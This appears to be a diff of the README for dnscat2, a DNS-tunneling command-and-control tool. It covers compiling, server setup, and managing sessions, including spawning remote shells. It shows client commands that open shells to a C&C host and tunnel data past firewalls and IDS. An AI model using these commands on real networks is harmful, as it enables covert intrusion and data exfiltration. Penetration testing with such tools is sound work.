@@ -13,8 +13,8 @@ out the doc/ folder.
 
 # License
 
-This is released under the BSD license. See LICENSE.md for more
-information.
+This is released under the BSD license. See [LICENSE.md](LICENSE.md) for
+more information.
 
 # Overview
 
@@ -32,31 +32,50 @@ to the authoritative DNS server for that domain (which you, presumably,
 have control of).
 
 If you don't have an authoritative DNS server, you can also use direct
-connections. They'll be faster, and still look like DNS traffic, but
-it's much more obvious in a packet log.
+connections on UDP/53 (or whatever you choose). They'll be faster, and
+still look like DNS traffic to the casual viewer, but it's much more
+obvious in a packet log (all domains are prefixed with "dnscat.", unless
+you hack the source). This mode will frequently be blocked by firewalls.
 
-The server is designed to be run on the authoritative server. It's in
-ruby, and depends on several different gems. When you run it, much like
-the client, you specify which domain(s) it should listen for. When it
-receives traffic for one of those domains, it attempts to establish a
-logical connection. If it receives other traffic, it ignores it by
-default, but can also forward it upstream.
+The server is designed to be run on an [authoritative DNS
+server](authoritative_dns_setup.md). It's in ruby, and depends on
+several different gems. When you run it, much like the client, you
+specify which domain(s) it should listen for in addition to listening
+for messages sent directly to it on UDP/53. When it receives traffic for
+one of those domains, it attempts to establish a logical connection.  If
+it receives other traffic, it ignores it by default, but can also
+forward it upstream.
 
 Detailed instructions for both parts are below.
+
+# How is this different from .....
+
+dnscat2 strives to be different from other DNS tunneling protocols by
+being designed for a special purpose: command and control.
+
+This isn't designed to get you off a hotel network, or to get free
+Internet on a plane. And it doesn't just tunnel TCP.
+
+It can tunnel any data, with no protocol attached. Which means it can
+upload and download files, it can run a shell, and it can do those
+things well. It can also potentially tunnel TCP, but that's only going
+to be added in the context of a pen-testing tool (that is, tunneling TCP
+into a network), not as a general purpose tunneling tool. That's been
+done, it's not interesting (to me).
 
 # Where to get it
 
 Here are some important links:
 
 * [Sourcecode on Github](https://github.com/iagox86/dnscat2)
-* [Downloads](https://downloads.skullsecurity.org/dnscat2/) (you'll find [signed](https://downloads.skullsecurity.org/ron.pgp) Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server - keep in mind that that signature file is hosted on the same server as the files, so if you're worried, please verify :) )
+* [Downloads](https://downloads.skullsecurity.org/dnscat2/) (you'll find [signed](https://downloads.skullsecurity.org/ron.pgp) Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server - keep in mind that that signature file is hosted on the same server as the files, so if you're worried, please verify my PGP key :) )
 * [User documentation](https://github.com/iagox86/dnscat2/blob/master/README.md) (this file)
 * [Protocol](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) and [command protocol](https://github.com/iagox86/dnscat2/blob/master/doc/command_protocol.md) documents (as a user, you probably don't need these)
 * [Issue tracker](https://github.com/iagox86/dnscat2/issues) (you can also email me issues, just put my first name (ron) in front of my domain name (skullsecurity.net))
 
 # How to play
 
-The theory behind dnscat is simple: it creates a tunnel over the DNS
+The theory behind dnscat2 is simple: it creates a tunnel over the DNS
 protocol.
 
 Why? Because DNS has an amazing property: it'll make its way from server
@@ -64,17 +83,21 @@ to server until it figures out where it's supposed to go.
 
 That means that for dnscat to get traffic off a secure network, it
 simply has to send messages to *a* DNS server, which will happily
-forward things through the DNS network until it gets to *your* dnscat
+forward things through the DNS network until it gets to *your* DNS
 server.
 
 That, of course, assumes you have access to an authoritative DNS server.
-dnscat also supports "direct" connections - that is, running a dnscat
+dnscat2 also supports "direct" connections - that is, running a dnscat
 client that directly connects to your dnscat on your ip address and UDP
-port 53. The traffic still looks like DNS traffic, and might get past
-dumber IDS/IPS systems, but is still likely to be stopped by firewalls.
+port 53 (by default). The traffic still looks like DNS traffic, and
+might get past dumber IDS/IPS systems, but is still likely to be stopped
+by firewalls.
 
-You can find a guide to setup an authoritative dns server on Namecheap in
-the docs.
+If you aren't clear on how to set up an authoritative DNS server, it's
+something you have to set up with a domain provider.
+[izhan](https://github.com/izhan) helpfully [wrote
+one](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md)
+for you!
 
 ## Compiling
 
@@ -89,31 +112,39 @@ Visual Studio (for Windows). Here are the commands on Linux:
     $ make
 
 On Windows, load client/win32/dnscat2.vcproj into Visual Studio and hit
-"build".
+"build". I created and test it on Visual Studio 2008 - until I get a
+free legit copy of a newer version, I'll likely be sticking with that
+one. :)
 
 If compilation fails, please file a bug on my [github
 page](https://github.com/iagox86/dnscat2/issues)! Please send details
 about your system.
 
-You can verify it's working by running it with no flags; you'll see it
-attempting to start a DNS tunnel with whatever your configured DNS
-server is:
+You can verify dnscat2 is successfully compiled by running it with no
+flags; you'll see it attempting to start a DNS tunnel with whatever your
+configured DNS server is (which will fail):
 
     $ ./dnscat
-    [[ WARNING ]] :: INPUT: Command
-    [[ WARNING ]] :: Session successfully created: 23518
-    [[ WARNING ]] :: Session creation request
-    [[ WARNING ]] :: Starting DNS driver without a domain! You'll probably need to use --host to specify a direct connection to your server.
-    [[ WARNING ]] :: Setting config: max_packet_length => 115
-    [[ WARNING ]] :: OUTPUT: DNS tunnel to 8.8.8.8:53 (no domain set!  This probably needs to be the exact server where the dnscat2 server is running!)
+    Starting DNS driver without a domain! This will only work if you
+    are directly connecting to the dnscat2 server.
+    
+    You'll need to use --dns server=<server> if you aren't.
+    Creating DNS driver:
+     domain = (null)
+     host   = 0.0.0.0
+     port   = 53
+     type   = TXT,CNAME,MX
+     server = 127.0.1.1
     [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
     [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    ^c
 
 ### Server
 
 The server isn't "compiled", as such, but it does require some Ruby
 dependencies. Unfortunately, Ruby dependencies can be annoying to get
-working, so good luck!
+working, so good luck! If any Ruby experts out there want to help make
+this section better, I'd be grateful!
 
 I'm assuming you have Ruby and Gem installed and in working order. If
 they aren't, install them with either `apt-get`, `emerge`, `rvm`, or
@@ -121,7 +152,7 @@ however is normal on your operating system.
 
 Once Ruby/Gem are sorted out, run these commands (note: you can
 obviously skip the `git clone` command if you already installed the
-client and skip the `gem install bundler` if you've already installed
+client and skip `gem install bundler` if you've already installed
 bundler):
 
     $ git clone https://github.com/iagox86/dnscat2.git
@@ -130,7 +161,9 @@ bundler):
     $ bundle install
 
 If you get a permissions error with `gem install bundler` or `bundler
-install`, you may need to run them as root.
+install`, you may need to run them as root. If you have a lot of
+problems, uninstall Ruby/Gem and install everything using `rvm` and
+without root.
 
 If you get an error that looks like this:
 
@@ -141,30 +174,32 @@ It means you need to install the -dev version of Ruby:
     $ sudo apt-get install ruby-dev
 
 I find that `sudo` isn't always enough to get everything working right,
-I sometimes have to switch to root and work directly.
+I sometimes have to switch to root and work directly as that account.
+`rvm` largely fixes that problem.
 
-You can verify it's working by running it with no flags and seeing if
-you get a dnscat2> prompt:
+You can verify the server is working by running it with no flags and
+seeing if you get a dnscat2> prompt:
 
-    $ sudo ruby ./dnscat2.rb
+    $ ruby ./dnscat2.rb
     Setting debug level to: WARNING
     It looks like you didn't give me any domains to recognize!
-    That's cool, though, you can still use a direct connection!
+    That's cool, though, you can still use a direct connection.
     Try running this on your client:
     
-    ./dnscat2 --host <server>
+    ./dnscat2 --dns server=<server>
     
-    Of course, you have to figure out <server> yourself!
+    Of course, you have to figure out <server> yourself! Clients will
+    connect directly on UDP port 53 (by default).
     
+    Set debug level to warning
     Starting DNS server...
-    Starting Dnscat2 DNS server on 0.0.0.0:5133 [domains = n/a]...
+    Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = n/a]...
     No domains were selected, which means this server will only respond to
     direct queries (using --host and --port on the client)
-    
-    dnscat2> 
 
 If you don't run it as root, you might have trouble listening on UDP/53
-(you can use --dnsport to change it).
+(you can use --dnsport to change it). You'll see a stacktrace and a
+warning at the bottom if that's the case.
 
 If anybody has a better guide on how to get the Ruby dependencies,
 please don't hesitate to send me a better guide or a pull request! I
@@ -213,9 +248,13 @@ available if you've compiled it:
 
     $ ./dnscat --ping skullseclabs.org
 
-If the ping succeeds, your C&C server is probably good! Note that the
---ping command doesn't respect the --host/--port settings, it'll only do
-a ping through the DNS hierarchy.
+If the ping succeeds, your C&C server is probably good! If you ran the
+DNS server on a different port, or if you need to use a custom DNS
+resolver, you can use the --dns flag in addition to --ping:
+
+    $ ./dnscat --dns server=8.8.8.8 --ping skullseclabs.org
+
+    $ ./dnscat --dns port=53531,server=localhost --ping skullseclabs.org
 
 ### Running a client
 
@@ -232,7 +271,7 @@ In that example, it will create a C&C session with the dnscat2 server
 running on skullseclabs.org. If an authoritative domain isn't an option,
 it can be given a specific ip address to connect to instead:
 
-    ./dnscat2 --host 206.220.196.59 --port 5353
+    ./dnscat2 --dns host=206.220.196.59,port=5353
 
 Assuming there's a dnscat2 server running on that host/port, it'll
 create a session there.
@@ -244,17 +283,17 @@ is a single virtual "connection" between a client and a server,
 identified by a 16-bit session_id value. A client can maintain multiple
 sessions with a single server (this happens when you spawn a shell from
 within a command session, for example). A server can maintain multiple
-sessions with multiple clients.
+sessions with multiple clients. Think of it as kind of a hub where all
+the connections come back to!
 
 There are several different types of sessions, but the default one -
 which I call a "command session" - is usually what you want (since the
 other ones can be created via that command session). If you want to play
 with other session types, you can pass --console or --exec to the dnscat
-client (the server will recognize the type automatically).
+client (the server will recognize the type automatically). Technically,
+--ping is also a session type, but it's handled specially.
 
-The server maintains a tree of sessions - in a what-created-what type of
-order - including a top-level virtual session. When you start the
-dnscat2 server, you'll be in that virtual session:
+When you run dnscat2, you'll see a simple prompt:
 
     dnscat2>
 
@@ -262,108 +301,111 @@ You can list the sessions using the `sessions` command (initially,
 there's only the one):
 
     dnscat2> sessions
-    command window
+    command window <-- You are here!
     dnscat2>
 
 When a new session is created, you'll be informed:
 
     dnscat2> sessions
-    command window
+    command window <-- You are here!
     dnscat2>
-    New session established: 2192
-    New session established: 62456
+    New session established: 19334
     
     dnscat2> sessions
-    command window
-      session 2192 [*] :: command session
-      session 62456 [*] :: command session
+    command window <-- You are here!
+     session 19334 :: command (default)
 
 You can interact with these sessions using the `session -i` command:
 
-    dnscat2> session -i 2192
+    dnscat2> session -i 19334
     
-    Welcome to a command session! Use 'help' for a list of commands or ^z for the main menu
-    dnscat [command: 2192]> 
+    Welcome to a command session! Use 'help' for a list of commands or ^z
+    for the main menu
+    dnscat [command: 19334]>
 
 These sessions can spawn further sessions:
 
-    dnscat [command: 2192]> shell
+    dnscat [command: 28993]> shell
     Sent request to execute a shell
-    dnscat [command: 2192]>
-    New session established: 18644
-    dnscat [command: 2192]> sessions
+    dnscat [command: 28993]>
+    New session established: 22670
+    dnscat [command: 28993]> sessions
     Sessions:
     
-    session 2192 :: command session
-     session 18644 :: executing a shell
-
-Note that when you run `sessions` from within a session, it only displays
-itself and any sessions below it.  If you want to go "back" to a parent
-session, use either ctrl-z or the "back" command:
-
-    dnscat [command: 2192]> back
-    [...]
-    dnscat2> sessions
     command window
-      session 2192 :: command session
-       session 18644 :: executing a shell
-       session 62456 [*] :: command session
-    dnscat2> 
+     session 28993 :: command (default) <-- You are here!
+     session 22670 [*] :: sh
+
+If you want to go "back" to a parent session, use either ctrl-z or the
+"back" command:
+
+    dnscat [command: 28993]> back
+    
+    dnscat2>
 
 Note that some sessions have `[*]` - that means that there's been
 activity since the last time we looked at them.
 
 When you interact with a session, the interface will look different
 depending on the session type. As you saw with the default session type
-(command sessions) you get a UI just like the top-level virtual session.
-however, if you interact with a 'shell' session, you won't see anything
-immediately, until you type a command:
+(command sessions) you get a UI just like the top-level virtual session
+(you can type 'help' or run commands or whatever). However, if you
+interact with a 'shell' session, you won't see much immediately,
+until you type a command:
 
-    dnscat2> session -i 18644
+    dnscat2> session -i 22670
+    
+    Welcome to session 22670! If it's a shell session and you're not seeing
+    output, try typing "pwd" or something!
     
     pwd
     /home/ron/tools/dnscat2/client
 
-To escape this, you can use ctrl-z or type "exit" (which will, of
-course, kill the session).
+To escape this, you can use ctrl-z or type "exit" (which will kill the
+session).
 
-You can start a shell directly by running the dnscat client with the
+You can start a shell directly by running the dnscat2 client with the
 --exec flag:
 
-    $ ./dnscat --host localhost --port 5133 --exec /bin/sh
+    $ ./dnscat --exec /bin/sh --dns server=localhost,port=53531
 
 On the server, you'll see a session created as usual:
 
     dnscat2>
-    New session established: 52356
+    New session established: 1387
+    
+    Unknown command: sessoin
     dnscat2> sessions
-    command window
-      session 2192 [*] :: command session :: [closed]
-       session 18644 :: executing a shell
-      session 62456 [*] :: command session
-     session 52356 :: /bin/sh
+    command window <-- You are here!
+     session 28993 :: command (default)
+     session 22670 :: sh
+     session 1387 [*] :: /bin/sh
 
 And you can interact with it as normal:
 
     dnscat2> session -i $newest
     
     pwd
-    /usr/local/google/home/rbowes/tools/dnscat2/client
+    /home/ron/tools/dnscat2/client
 
-(Note that I used $newest as a variable - $newest always refers to the
-most recent session! See other variables by running `set`)
+(Note that I used a variable - $newest - which always refers to the most
+recent session! See other variables by running `set`)
 
 Lastly, to kill a session, the `kill` command can be used:
 
-    dnscat2> kill 2192
+    dnscat2> sessions
+    command window <-- You are here!
+     session 28993 :: command (default)
+     session 22670 :: sh
+     session 1387 [*] :: /bin/sh
+    dnscat2> 
+    dnscat2> kill 22670
     Session killed
     dnscat2> sessions
-    command window
-      session 2192 [*] :: command session :: [closed]
-       session 18644 :: executing a shell
-      session 62456 [*] :: command session
-     session 52356 :: /bin/sh
-
+    command window <-- You are here!
+     session 28993 :: command (default)
+     session 22670 [*] :: sh :: [idle for 13 seconds]
+     session 1387 [*] :: /bin/sh
 
 # History
 
